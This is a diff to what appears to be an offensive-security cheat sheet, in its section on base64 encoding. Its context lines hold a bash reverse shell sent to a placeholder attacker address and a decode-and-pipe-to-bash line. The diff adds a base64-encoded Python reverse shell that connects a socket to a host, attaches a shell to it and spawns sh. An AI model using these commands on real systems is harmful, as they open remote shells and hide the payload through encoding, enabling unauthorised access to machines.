@@ -185,7 +185,8 @@ base64
 
 ```shell
 echo 'bash -c "bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1"' | base64
-echo -n <base64 command string> | base64 -d | bash       
+echo -n <base64 command string> | base64 -d | bash 
+# echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNy4wLjAuMSIsODApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw== | base64 -d | bash      
 ```
 
 ### :open_file_folder: Cron jobs
